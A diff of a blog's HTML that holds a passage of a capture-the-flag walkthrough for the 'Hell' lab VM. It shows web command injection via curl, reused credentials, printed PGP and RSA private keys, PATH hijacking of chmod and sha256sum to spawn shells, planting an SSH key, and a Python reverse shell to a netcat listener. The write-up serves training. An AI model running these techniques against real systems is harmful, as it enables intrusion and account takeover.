 
 <p>Yay :) With this confirmed working, I modified the command exec request slightly so that commands with potentially strange characters are correctly encoded etc:</p>
 
-<p>```bash Hell &lsquo;better&rsquo; command execution
-curl <a href="http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c=$(echo">http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c=$(echo</a> -n “ls -lah” | python -c &ldquo;import urllib, sys; print urllib.quote(&rdquo;.join(sys.stdin));&ldquo;) -c cookies -b cookies</p>
+<pre><code class="language-bash">curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c=$(echo -n “ls -lah” | python -c &quot;import urllib, sys; print urllib.quote(''.join(sys.stdin));&quot;) -c cookies -b cookies
+</code></pre>
 
-<pre><code>
-## becoming jack
-With command execution, it was easy to start enumerating as much as possible about the VM. At least as much as the `www-data` user has access to, which is generally quite a lot.
+<h2 id="becoming-jack:b2f2177e9b11b0fc1c7ac5c94bf719fa">becoming jack</h2>
 
-I looked at the source files for the website out of curiosity about the filtering etc that was going on. I stumbled upon some MySQL credentials in `login.php`:
+<p>With command execution, it was easy to start enumerating as much as possible about the VM. At least as much as the <code>www-data</code> user has access to, which is generally quite a lot.</p>
 
-```php MySQL credentials
-// mysql_connect(&quot;127.0.0.1&quot;, &quot;Jack&quot;, &quot;zgcR6mU6pX&quot;) or die (&quot;Server Error&quot;); I'll change this back once development is done. Got sick of typing my password.
+<p>I looked at the source files for the website out of curiosity about the filtering etc that was going on. I stumbled upon some MySQL credentials in <code>login.php</code>:</p>
+
+<pre><code class="language-php">// mysql_connect(&quot;127.0.0.1&quot;, &quot;Jack&quot;, &quot;zgcR6mU6pX&quot;) or die (&quot;Server Error&quot;); I'll change this back once development is done. Got sick of typing my password.
 mysql_connect(&quot;127.0.0.1&quot;, &quot;www-data&quot;, &quot;website&quot;) or die(&quot;Server Error&quot;);
 </code></pre>
 
 <p>The comment was quite helpful along with all the mentions of Jack on the website, along with the <code>/etc/passwd</code> revealing a <code>jack</code> user, I tried these credentials on a SSH session:</p>
 
-<p>```bash ssh as jack
-root@kali:~# ssh jack@192.168.56.102
-jack@192.168.56.102&rsquo;s password:
-Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686</p>
+<pre><code class="language-bash">root@kali:~# ssh jack@192.168.56.102
+jack@192.168.56.102's password:
+Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686
 
-<p>The programs included with the Debian GNU/Linux system are free software;
+The programs included with the Debian GNU/Linux system are free software;
 the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.</p>
+individual files in /usr/share/doc/*/copyright.
 
-<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 No mail.
 Last login: Sun Jul 20 04:29:06 2014 from 192.168.56.1
 $ id
 uid=1001(jack) gid=1001(jack) groups=1001(jack)
-$</p>
+$
+</code></pre>
 
-<pre><code>
-Well that was easy... With this shell, I also checked out the MySQL database to see if there is any interesting information:
+<p>Well that was easy&hellip; With this shell, I also checked out the MySQL database to see if there is any interesting information:</p>
 
-```mysql Hell MySQL
-$ mysql -uwww-data -pwebsite
+<pre><code class="language-bash">$ mysql -uwww-data -pwebsite
 Welcome to the MySQL monitor.  Commands end with ; or \g.
 Your MySQL connection id is 10320
 Server version: 5.5.37-0+wheezy1 (Debian)
@@ -726,23 +697,22 @@ mysql&gt;
 
 <p>Jack had a <code>.pgp</code> folder with a private key stored in hes home directory.</p>
 
-<p>```bash jacks private PGP key
-$ pwd
-/home/jack/.pgp</p>
+<pre><code class="language-bash">$ pwd
+/home/jack/.pgp
 
-<p>$ ls -lah
+$ ls -lah
 total 20K
-drwx&mdash;&mdash; 2 jack jack 4.0K Jun 18 12:35 .
-drwx&mdash;&mdash; 4 jack jack 4.0K Jun 22 18:28 ..
--rwx&mdash;&mdash; 1 jack jack   39 Jun 18 12:35 note
--rwx&mdash;&mdash; 1 jack jack 1.8K Jun 18 12:20 pgp.priv
--rwx&mdash;&mdash; 1 jack jack  890 Jun 18 12:24 pgp.pub</p>
+drwx------ 2 jack jack 4.0K Jun 18 12:35 .
+drwx------ 4 jack jack 4.0K Jun 22 18:28 ..
+-rwx------ 1 jack jack   39 Jun 18 12:35 note
+-rwx------ 1 jack jack 1.8K Jun 18 12:20 pgp.priv
+-rwx------ 1 jack jack  890 Jun 18 12:24 pgp.pub
 
-<p>$ cat pgp.priv
-&mdash;&ndash;BEGIN PGP PRIVATE KEY BLOCK&mdash;&ndash;
-Version: BCPG C# v1.6.1.0</p>
+$ cat pgp.priv
+-----BEGIN PGP PRIVATE KEY BLOCK-----
+Version: BCPG C# v1.6.1.0
 
-<p>lQOsBFOg9v8BCACbr++BXlL9e4N6pzcrHkNZGANB7Ii3vHc0Nj37kCm7ZuTMx4LN
+lQOsBFOg9v8BCACbr++BXlL9e4N6pzcrHkNZGANB7Ii3vHc0Nj37kCm7ZuTMx4LN
 bpWrqGb9W9grS9YQ7xSEkBShaKlWMilb4rqrM/tmDyuGt9UozCrVrCTfaZdPl72o
 u1QO1DxTT9/iFwlb6AAjTvJGQQx92PQeShEOeTtycH+Xz4tx1ezHpbA4HK9ijftR
 lyZy+y9GPSqYLsIU3N8WtnrTJRfSMiU/AGv/GWpykp3tlHjIL0YSHfvUppe4xAil
@@ -770,32 +740,30 @@ zHsfGaeU1hCQJg/n83IRxTBsc7h1jIOxraovzbErqpZ6YeYhCK5oo38dJVpz9Daa
 quU6lGTizKWX3HS29HQl+PJvzoHyj3T6Aw71BZF4lZNrJmzxHqhVYuRWptioyTWo
 tqg=
 =SCkw
-&mdash;&ndash;END PGP PRIVATE KEY BLOCK&mdash;&ndash;
-$</p>
+-----END PGP PRIVATE KEY BLOCK-----
+$
+</code></pre>
 
-<pre><code>
-There was also a note in the directory:
+<p>There was also a note in the directory:</p>
 
-```bash Jacks Note
-$ cat note
+<pre><code class="language-bash">$ cat note
 The usual password as with everything.
 </code></pre>
 
 <p>With all this information now known to us, and the fact that I know PGP is pretty popular to encrypt files and sign mail, I figured we had to get this key loaded and decrypt something using it. Further enumeration revealed that <code>/var/mail</code> was world readable:</p>
 
-<p>```bash Account details:
-$ pwd
+<pre><code class="language-bash">$ pwd
 /var/mail/jack/received
 $ ls -lah
 total 12K
 drwxr-sr-x 2 root mail 4.0K Jun 18 12:26 .
 drwxr-sr-x 3 jack jack 4.0K Jul  5 19:56 ..
--rw-r&ndash;r&ndash; 1 root mail  709 Jun 18 12:26 message.eml
+-rw-r--r-- 1 root mail  709 Jun 18 12:26 message.eml
 $ cat message.eml
-&mdash;&ndash;BEGIN PGP MESSAGE&mdash;&ndash;
-Version: BCPG C# v1.6.1.0</p>
+-----BEGIN PGP MESSAGE-----
+Version: BCPG C# v1.6.1.0
 
-<p>hQEMA726wSU/GKsKAQf/ZnGxyaHQ6wMhSzpbn2J2uVKoPFS3tHdnBzJ18kswBwOm
+hQEMA726wSU/GKsKAQf/ZnGxyaHQ6wMhSzpbn2J2uVKoPFS3tHdnBzJ18kswBwOm
 yff3Joe5RTtMgdjydD+37DSg6SikjcdzJiHV3y5QHqxVcNt5xo0BdYNCWoqjdMzJ
 3g50VEwMg5DZwLvTmUr4f+CJ7bc/Cv2hHazKXnT7s71lqBLSCCsNwZuWpxYW1OMX
 7CNE92QXayltmQ0GLajIMtzmGlszgwQkVjQ2h9wMGelVYHi5hYsEZzIdh6/9Jo24
@@ -806,13 +774,12 @@ V8xJ7ZUxsh67w/5s5s1JgEDQt+f4wckBc8Dx5k9SbS9iRUbZ0oLJ3IM8cUj3CDoo
 svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
 +oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug==
 =svWU
-&mdash;&ndash;END PGP MESSAGE&mdash;&ndash;</p>
+-----END PGP MESSAGE-----
+</code></pre>
 
-<pre><code>
-I loaded the private GPG key into jacks keyring with:
+<p>I loaded the private GPG key into jacks keyring with:</p>
 
-```bash Loading Jacks private key
-$ gpg --import .pgp/pgp.priv
+<pre><code class="language-bash">$ gpg --import .pgp/pgp.priv
 gpg: keyring `/home/jack/.gnupg/secring.gpg' created
 gpg: key 3F18AB0A: secret key imported
 gpg: key 3F18AB0A: public key &quot;jack@cowlovers.com&quot; imported
@@ -824,33 +791,31 @@ gpg:   secret keys imported: 1
 
 <p>Ofc this doesn’t mean I can actually use it yet, however there was a note about the password, so I could possibly just try all the ones I have found so far for jack. Decrypting the encrypted message we found for jack was as simple as:</p>
 
-<p>```bash Decryting Jacks mail
-$ gpg /var/mail/jack/received/message.eml</p>
+<pre><code class="language-bash">$ gpg /var/mail/jack/received/message.eml
 
-<p>You need a passphrase to unlock the secret key for
-user: &ldquo;jack@cowlovers.com&rdquo;</p>
+You need a passphrase to unlock the secret key for
+user: &quot;jack@cowlovers.com&quot;
 
-<h1 id="used-the-password-g0tmi1k69-found-in-the-mysql-database:b2f2177e9b11b0fc1c7ac5c94bf719fa">used the password g0tmi1k69 found in the MySQL database</h1>
+# used the password g0tmi1k69 found in the MySQL database
 
-<p>2048-bit RSA key, ID 3F18AB0A, created 2014-06-18</p>
+2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
 
-<p>gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
+gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
 gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
-      &ldquo;jack@cowlovers.com&rdquo;
+      &quot;jack@cowlovers.com&quot;
 gpg: /var/mail/jack/received/message.eml: unknown suffix
 Enter new filename [text.txt]:
-gpg: WARNING: message was not integrity protected</p>
+gpg: WARNING: message was not integrity protected
 
-<p>$ cat text.txt
-Ok Jack. I&rsquo;ve created the account &lsquo;milk_4_life&rsquo; as per your request. Please stop emailing me about this now or I&rsquo;m going to talk to HR like we discussed.</p>
+$ cat text.txt
+Ok Jack. I've created the account 'milk_4_life' as per your request. Please stop emailing me about this now or I'm going to talk to HR like we discussed.
 
-<p>The password is &lsquo;4J0WWvL5nS&rsquo;</p>
+The password is '4J0WWvL5nS'
+</code></pre>
 
-<pre><code>
-So, lets ssh in as `milk_4_life`...
+<p>So, lets ssh in as <code>milk_4_life</code>&hellip;</p>
 
-```bash SSH as milk_4_life
-root@kali:~# ssh milk_4_life@192.168.56.102
+<pre><code class="language-bash">root@kali:~# ssh milk_4_life@192.168.56.102
 milk_4_life@192.168.56.102's password:
 Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686
 
@@ -870,18 +835,16 @@ uid=1002(milk_4_life) gid=1002(milk_4_life) groups=1002(milk_4_life)
 
 <p>The user <code>milk_4_life</code> has a <code>game</code> in hes home folder.</p>
 
-<p>```bash milk_4_life game
-$ ls -lah game
-&mdash;s&ndash;x&ndash;x 1 george george 5.7K Jun 19 18:24 game</p>
+<pre><code class="language-bash">$ ls -lah game
+---s--x--x 1 george george 5.7K Jun 19 18:24 game
 
-<p>$ ./game
-I&rsquo;m listening</p>
+$ ./game
+I'm listening
+</code></pre>
 
-<pre><code>
-Not a very interesting game thus far. I decided to quit and rerun the game, this time backgrounding it with `&amp;`. At this stage I wanted to run a netstat to see if it is _listening_ on a port or something, but the netstat command was not available. I figured I could cause a error as the same port can not be opened twice. So, with `./game &amp;` already running, another instance of `./game` errored out, revealing the listening port:
+<p>Not a very interesting game thus far. I decided to quit and rerun the game, this time backgrounding it with <code>&amp;</code>. At this stage I wanted to run a netstat to see if it is <em>listening</em> on a port or something, but the netstat command was not available. I figured I could cause a error as the same port can not be opened twice. So, with <code>./game &amp;</code> already running, another instance of <code>./game</code> errored out, revealing the listening port:</p>
 
-```bash Game TCP port
-$ ./game &amp;
+<pre><code class="language-bash">$ ./game &amp;
 I'm listening
 
 $ ./game
@@ -897,32 +860,30 @@ $
 
 <p>tcp/1337 it is. Lets telnet to this:</p>
 
-<p>```bash Game Interface
-milk_4_life@hell:~$ telnet 127.0.0.1 1337
-Trying 127.0.0.1&hellip;
+<pre><code class="language-bash">milk_4_life@hell:~$ telnet 127.0.0.1 1337
+Trying 127.0.0.1...
 Connected to 127.0.0.1.
-Escape character is &lsquo;^]&rsquo;.
-Type &lsquo;START&rsquo; to begin</p>
+Escape character is '^]'.
+Type 'START' to begin
 
-<p>START
-Starting&hellip;</p>
+START
+Starting...
 
-<p>You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723)</p>
+You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723)
 
-<p>Quick what&rsquo;s&hellip; 397 x 358? 1
-Quick what&rsquo;s&hellip; 498 x 111? 2
-Quick what&rsquo;s&hellip; 740 x 772?
-Final Score: 0</p>
+Quick what's... 397 x 358? 1
+Quick what's... 498 x 111? 2
+Quick what's... 740 x 772?
+Final Score: 0
 
-<p>Connection closed by foreign host.
-milk_4_life@hell:~$</p>
+Connection closed by foreign host.
+milk_4_life@hell:~$
+</code></pre>
 
-<pre><code>
-Typing anything other than `START` would simply cause the script to die. Typing a non integer as a answer causes a loop, and that is about it.
-Sooo, time to win this game and see what would happen. I decided to attempt this with a python script. The general idea would be to read the socket output, calculate the answer and send that back. This resulted in a script as follows (yeah I know its not perfect but gets the job done):
+<p>Typing anything other than <code>START</code> would simply cause the script to die. Typing a non integer as a answer causes a loop, and that is about it.
+Sooo, time to win this game and see what would happen. I decided to attempt this with a python script. The general idea would be to read the socket output, calculate the answer and send that back. This resulted in a script as follows (yeah I know its not perfect but gets the job done):</p>
 
-```python play_game.py
-#!/usr/bin/python
+<pre><code class="language-python">#!/usr/bin/python
 import socket, sys
 
 # start a socket
@@ -970,18 +931,16 @@ sock.close()
 
 <p>I ran this in another session with <code>./game</code> running and won :P Once you win, the output results in:</p>
 
-<p>```bash Game Win Output
-!<em>!</em>!<em>!</em>! Congratulations, new high score (302785) !<em>!</em>!<em>!</em>!</p>
+<pre><code class="language-bash">!*!*!*!*! Congratulations, new high score (302785) !*!*!*!*!
 
-<p>I hear the faint sound of chmodding&hellip;&hellip;.</p>
+I hear the faint sound of chmodding.......
+</code></pre>
 
-<pre><code>
-... and ends. Heh, ok. Well that was probably not exactly what I hoped for, but nonetheless, the chmodding is at least a hint. The first thing that came to mind is a important file that was previously not available now possibly is as its been chmodded by `george` after winning the game. Or, if it is in fact a chmod that is being run, is it being called via a system command from its full path (/usr/bin/chmod), or just via chmod?
+<p>&hellip; and ends. Heh, ok. Well that was probably not exactly what I hoped for, but nonetheless, the chmodding is at least a hint. The first thing that came to mind is a important file that was previously not available now possibly is as its been chmodded by <code>george</code> after winning the game. Or, if it is in fact a chmod that is being run, is it being called via a system command from its full path (/usr/bin/chmod), or just via chmod?</p>
 
-To test, I fired up another editor on `chmod.py` and just put a line to echo test. I `chmod +x` this and moved the file to `/tmp`. I then added `/tmp` to `PATH` via `export PATH=/tmp:$PATH`:
+<p>To test, I fired up another editor on <code>chmod.py</code> and just put a line to echo test. I <code>chmod +x</code> this and moved the file to <code>/tmp</code>. I then added <code>/tmp</code> to <code>PATH</code> via <code>export PATH=/tmp:$PATH</code>:</p>
 
-```bash Testing chmod path resolve
-milk_4_life@hell:~$ python chmod.py          # test the script
+<pre><code class="language-bash">milk_4_life@hell:~$ python chmod.py          # test the script
 Testing chmod exec
 milk_4_life@hell:~$ cp chmod.py /tmp/chmod   # copy it to /tmp
 milk_4_life@hell:~$ chmod +x /tmp/chmod      # make it executable
@@ -997,16 +956,14 @@ Testing chmod exec                           # profit :)
 
 <p>With it confirmed that <code>chmod</code> was not called from its full path once you win the game (using our previously mentioned winning script :D), it was time to edit our <code>chmod</code> script to be slightly more useful:</p>
 
-<p>```python Evil chmod
-#!/usr/bin/python
+<pre><code class="language-python">#!/usr/bin/python
 import pty
-pty.spawn(&lsquo;/bin/sh&rsquo;)</p>
+pty.spawn('/bin/sh')
+</code></pre>
 
-<pre><code>
-With this now in /tmp/chmod, I reran `./game.py`, and then `./play_game.py`. After 30 seconds on the session we started the game we had:
+<p>With this now in /tmp/chmod, I reran <code>./game.py</code>, and then <code>./play_game.py</code>. After 30 seconds on the session we started the game we had:</p>
 
-```bash George's permissions
-milk_4_life@hell:~$ ./game
+<pre><code class="language-bash">milk_4_life@hell:~$ ./game
 I'm listening
 $ id
 uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
@@ -1015,21 +972,19 @@ $
 
 <p>Profit! We now have access to <code>george</code>&rsquo;s home directory :) In order to make the next steps easier, I quickly generated a new ssh key pair using <code>ssh-keygen</code>, and added the contents of the resultant <code>id_rsa.pub</code> to <code>.ssh/authorized_keys</code>. Whats important to note in the below snippet is that the full path of <code>chmod</code> is used. If we don’t, we will be hitting the chmod we just fooled to get to this shell in the first place :D</p>
 
-<p>```bash Adding ssh key to George&rsquo;s authorized_keys
-$ id
+<pre><code class="language-bash">$ id
 uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
 $ cd /home/george
 $ mkdir .ssh
 $ /bin/chmod 755 .ssh
 $ cd .ssh
-$ echo &ldquo;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3KB7V05tHJAWFavTgTK1dDIcUUVyUpZA3TYQhydNjeexWDeVzPNUGCo3/XZNgqw0QpaoX5eLm9k9OqxNyr7x5B6Rq2F7ykA0DHglbM4DLJDQRawHgoCzTwxBWAMva3HUbahounJFe9fOaECGZEsCmTF1462wTuZ/SYOO9lSHv38cO8b9nC5lteBz2An34+W/n9X1sxBAlDAHyXmAqJYpoE+gur+YX8j3WPNJbiBu3nVnvpDaR1BnvN1n74/yUtLYziT5Gt7lgRWiaDhzslR+46xbu/YmCyO03ztHhD/lD2JAcoEe43FKFUdh8ZGfBqCq0CbBB86KHhhLzV6QjLHjV root@kali&rdquo; &gt; authorized_keys
-$ /bin/chmod 600 authorized_keys</p>
+$ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3KB7V05tHJAWFavTgTK1dDIcUUVyUpZA3TYQhydNjeexWDeVzPNUGCo3/XZNgqw0QpaoX5eLm9k9OqxNyr7x5B6Rq2F7ykA0DHglbM4DLJDQRawHgoCzTwxBWAMva3HUbahounJFe9fOaECGZEsCmTF1462wTuZ/SYOO9lSHv38cO8b9nC5lteBz2An34+W/n9X1sxBAlDAHyXmAqJYpoE+gur+YX8j3WPNJbiBu3nVnvpDaR1BnvN1n74/yUtLYziT5Gt7lgRWiaDhzslR+46xbu/YmCyO03ztHhD/lD2JAcoEe43FKFUdh8ZGfBqCq0CbBB86KHhhLzV6QjLHjV root@kali&quot; &gt; authorized_keys
+$ /bin/chmod 600 authorized_keys
+</code></pre>
 
-<pre><code>
-Now we can SSH into the VM as `george`
+<p>Now we can SSH into the VM as <code>george</code></p>
 
-```bash SSH Access as george
-root@kali:~# ssh george@192.168.56.102 -i id_rsa
+<pre><code class="language-bash">root@kali:~# ssh george@192.168.56.102 -i id_rsa
 Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686
 
 The programs included with the Debian GNU/Linux system are free software;
@@ -1049,24 +1004,23 @@ george@hell:~$
 
 <p><code>george</code> also had mail in <code>/var/mail</code>:</p>
 
-<p>```bash George&rsquo;s Signup Mail
-george@hell:~$ cat /var/mail/george/signup.eml
+<pre><code class="language-bash">george@hell:~$ cat /var/mail/george/signup.eml
 From: admin@rockyou.com
 To: super_admin@hell.com
 Subject: Account Activation
-Date: 13th November 2009</p>
+Date: 13th November 2009
 
-<p>Thanks for signing up for your account. I hope you enjoy our services.
-george@hell:~$</p>
+Thanks for signing up for your account. I hope you enjoy our services.
+george@hell:~$
+</code></pre>
 
-<pre><code>
-There is a mention of _rockyou_ in the From address. There is a famous rockyou wordlist used for password cracking out in the wild. With that in mind, and the fact that it was 0430 already, I decided to copy the `container.tc` to my Kali Linux install, and have `truecrack` have a go at it while I catch up on some much deserved sleep.
+<p>There is a mention of <em>rockyou</em> in the From address. There is a famous rockyou wordlist used for password cracking out in the wild. With that in mind, and the fact that it was 0430 already, I decided to copy the <code>container.tc</code> to my Kali Linux install, and have <code>truecrack</code> have a go at it while I catch up on some much deserved sleep.</p>
 
-### fast forward a few hours
-A few hours passed, with 0 luck on cracking the password for the container. I started to realize that this _may_ not be the correct path in getting the container open, assuming that is the next step. However, as a last resort, I opted to copy the files onto my Windows gaming PC and run it via a GPU cracker, [oclHashcat](http://hashcat.net/oclhashcat/).
+<h3 id="fast-forward-a-few-hours:b2f2177e9b11b0fc1c7ac5c94bf719fa">fast forward a few hours</h3>
 
-```bash Windows ocl hashcat
-C:\Users\Somedude\Downloads\oclHashcat-1.21\oclHashcat-1.21&gt;oclHashcat64.exe
+<p>A few hours passed, with 0 luck on cracking the password for the container. I started to realize that this <em>may</em> not be the correct path in getting the container open, assuming that is the next step. However, as a last resort, I opted to copy the files onto my Windows gaming PC and run it via a GPU cracker, <a href="http://hashcat.net/oclhashcat/">oclHashcat</a>.</p>
+
+<pre><code class="language-bash">C:\Users\Somedude\Downloads\oclHashcat-1.21\oclHashcat-1.21&gt;oclHashcat64.exe
 -m 6211 C:\Users\Somedude\Desktop\Hell\container.tc C:\Users\Somedude\Desktop\Hell\rockyou.txt
 
 [snip]
@@ -1097,21 +1051,20 @@ Stopped: Sun Jul 20 14:26:42 2014
 
 <p>So, lets mount the container and see whats inside:</p>
 
-<p>```bash george TrueCrypt container
-george@hell:~$ truecrypt container.tc
+<pre><code class="language-bash">george@hell:~$ truecrypt container.tc
 Enter mount directory [default]:
 Enter password for /home/george/container.tc: letsyouupdateyourfunnotesandmore
 Enter keyfile [none]:
-Protect hidden volume (if any)? (y=Yes/n=No) [No]:</p>
+Protect hidden volume (if any)? (y=Yes/n=No) [No]:
 
-<p>george@hell:~$ cd /media/truecrypt1/
+george@hell:~$ cd /media/truecrypt1/
 george@hell:/media/truecrypt1$ ls -lah
 total 22K
-drwx&mdash;&mdash; 2 george george  16K Jan  1  1970 .
+drwx------ 2 george george  16K Jan  1  1970 .
 drwxr-xr-x 4 root   root   4.0K Jul 21 18:50 ..
--rwx&mdash;&mdash; 1 george george 1.7K Jul  5 20:01 id_rsa
+-rwx------ 1 george george 1.7K Jul  5 20:01 id_rsa
 george@hell:/media/truecrypt1$ cat id_rsa
-&mdash;&ndash;BEGIN RSA PRIVATE KEY&mdash;&ndash;
+-----BEGIN RSA PRIVATE KEY-----
 MIIEpQIBAAKCAQEAxlCbg0ln2dqRO3iIXPUvK3irg/9l5uvBAQdXTVmcm/JWN9OA
 25XtZX8LOfiJtc+8OYXgD6lXNVPh9BjElq6qpR7fk1TaXXUlyiSlwCxz68n/cpYs
 f6UUa9QXm0LSHD8m7g/e5qqIm8bb15TIC6+8TmSB11FE9NLPN+8hVyP1S9EBntom
@@ -1137,14 +1090,13 @@ W5WP78UyRlesoCOyj9oihsss9zxbsYcSDJ86j6iO1Xpr08zMIDfCNigUplJjja4S
 ZNE3ypLrAoGAbp+vBcqQRfnXWfmcdnHYFbwgWbokPSe2fScajWiyvcg4/6gL1e50
 rpO3RTOREUD02pBbyG4LDFv7x/5niqASL0tS8/0xWDBDj5QmD9UTmMd5hsMbj8Lw
 qJA0ErZEjIE9+jXYLbsTsB8tRTsqMqBfCCovHXAjy0h5B6j500PfImM=
-&mdash;&ndash;END RSA PRIVATE KEY&mdash;&ndash;
-george@hell:/media/truecrypt1$</p>
+-----END RSA PRIVATE KEY-----
+george@hell:/media/truecrypt1$
+</code></pre>
 
-<pre><code>
-So, a rsa private key. A wild shot in the dark sais this is the private key for one of the other users as per the `/etc/passwd`. I saved the key to a file on my Kali Linux box and attempted to SSH in as `bazza`, specifying the private key to use:
+<p>So, a rsa private key. A wild shot in the dark sais this is the private key for one of the other users as per the <code>/etc/passwd</code>. I saved the key to a file on my Kali Linux box and attempted to SSH in as <code>bazza</code>, specifying the private key to use:</p>
 
-```bash ssh access as Bazza
-root@kali:~# ssh bazza@192.168.56.102 -i truecrypt_id_rsa
+<pre><code class="language-bash">root@kali:~# ssh bazza@192.168.56.102 -i truecrypt_id_rsa
 Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686
 
 The programs included with the Debian GNU/Linux system are free software;
@@ -1163,18 +1115,16 @@ $
 
 <p><code>bazza</code> had 2 interesting files in hes home directory:</p>
 
-<p>```bash Bazza Home
-bazza@hell:~$ ls -lh
+<pre><code class="language-bash">bazza@hell:~$ ls -lh
 total 20K
--rw-r&ndash;r&ndash; 1 root root        109 Jul  6 18:32 barrebas.txt
+-rw-r--r-- 1 root root        109 Jul  6 18:32 barrebas.txt
 -r-xr-sr-x 1 oj   developers 6.1K Jul  6 18:39 part1
--r-sr-xr-x 1 oj   oj         5.2K Jul  6 18:34 part2</p>
+-r-sr-xr-x 1 oj   oj         5.2K Jul  6 18:34 part2
+</code></pre>
 
-<pre><code>
-The `barrebas.txt` looks to be a shoutout to the tester of the vulns. `part1` &amp; `part2` from first glance had interesting permissions, and made it relatively easy to determine that the next user we should be after this is `oj`. Running `part1` and `part2`:
+<p>The <code>barrebas.txt</code> looks to be a shoutout to the tester of the vulns. <code>part1</code> &amp; <code>part2</code> from first glance had interesting permissions, and made it relatively easy to determine that the next user we should be after this is <code>oj</code>. Running <code>part1</code> and <code>part2</code>:</p>
 
-```bash bazza puzzle
-bazza@hell:~$ ./part1
+<pre><code class="language-bash">bazza@hell:~$ ./part1
 Checking integrity of part2... Done!!
 
 Checking integrity of calling target... Done!!
@@ -1197,10 +1147,9 @@ bazza@hell:~$
 
 <p>We start with a <code>strings</code> of <code>part1</code>:</p>
 
-<p>```bash part1 strings
-bazza@hell:~$ strings part1
+<pre><code class="language-bash">bazza@hell:~$ strings part1
 /lib/ld-linux.so.2
-<strong>gmon_start</strong>
+__gmon_start__
 libc.so.6
 _IO_stdin_used
 puts
@@ -1212,38 +1161,39 @@ pclose
 strcmp
 __libc_start_main
 GLIBC_2.1
-GLIBC<em>2.0
+GLIBC_2.0
 PTRh
 QVhl
-[^</em>]
+[^_]
 900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1  /home/bazza/part2
 1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8  /usr/bin/id
-Checking integrity of part2&hellip;
+Checking integrity of part2...
 sha256sum /home/bazza/part2
 Failed to run command
  Done!!
-Checking integrity of calling target&hellip;
+Checking integrity of calling target...
 sha256sum /usr/bin/id
-Uh oh&hellip;. Corrupted or in wrong directory (/home/bazza/)
+Uh oh.... Corrupted or in wrong directory (/home/bazza/)
  Done!!
 Binary and target confirmed.
 /home/bazza/part2
 Target corrupt
-;*2$&rdquo;</p>
+;*2$&quot;
+</code></pre>
 
-<pre><code>
-This should give you a pretty good idea of what is potentially going on in the binary, like:
+<p>This should give you a pretty good idea of what is potentially going on in the binary, like:</p>
 
-   - Check the sha256sum of /gome/bazza/part matches 900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1
-   - Check the sha256sum of /usr/bin/id matches 1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8
-   - Eventually Fail if these don’t match.
+<ul>
+<li>Check the sha256sum of /gome/bazza/part matches 900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1</li>
+<li>Check the sha256sum of /usr/bin/id matches 1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8</li>
+<li>Eventually Fail if these don’t match.</li>
+</ul>
 
-The key lies in the fact that the `sha256sum` command does not appear to be called from its full path location ie: /usr/bin/sha256sum. So, similar to how we fooled the `chmod` earlier, we are going to do exactly the same with the `sha256sum`.
+<p>The key lies in the fact that the <code>sha256sum</code> command does not appear to be called from its full path location ie: /usr/bin/sha256sum. So, similar to how we fooled the <code>chmod</code> earlier, we are going to do exactly the same with the <code>sha256sum</code>.</p>
 
-As before, we create a _evil sha256sum_ command, which is actually just a python script to spawn `/bin/sh`, then prefix `PATH` with `/tmp` and run `./part1`. For this one however, I was having trouble with the pty.spawn() and didn't really feel like troubleshooting that much. So I opted for a (reverse shell)[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet] payload instead to open on a netcat listener that I have on my host laptop:
+<p>As before, we create a <em>evil sha256sum</em> command, which is actually just a python script to spawn <code>/bin/sh</code>, then prefix <code>PATH</code> with <code>/tmp</code> and run <code>./part1</code>. For this one however, I was having trouble with the pty.spawn() and didn&rsquo;t really feel like troubleshooting that much. So I opted for a (reverse shell)[<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a>] payload instead to open on a netcat listener that I have on my host laptop:</p>
 
-```python Reverse Shell
-#!/usr/bin/python
+<pre><code class="language-python">#!/usr/bin/python
 import socket,subprocess,os
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -1258,16 +1208,14 @@ p = subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])
 
 <p>I spawned a <code>netcat</code> listener on my laptop using <code>nc -l 4444</code>, and ran <code>./part1</code>:</p>
 
-<p>```bash Answered netcat
-→ nc -l 4444
+<pre><code class="language-bash">→ nc -l 4444
 $ id
-uid=1004(bazza) gid=1004(bazza) egid=1003(developers) groups=1004(bazza)</p>
+uid=1004(bazza) gid=1004(bazza) egid=1003(developers) groups=1004(bazza)
+</code></pre>
 
-<pre><code>
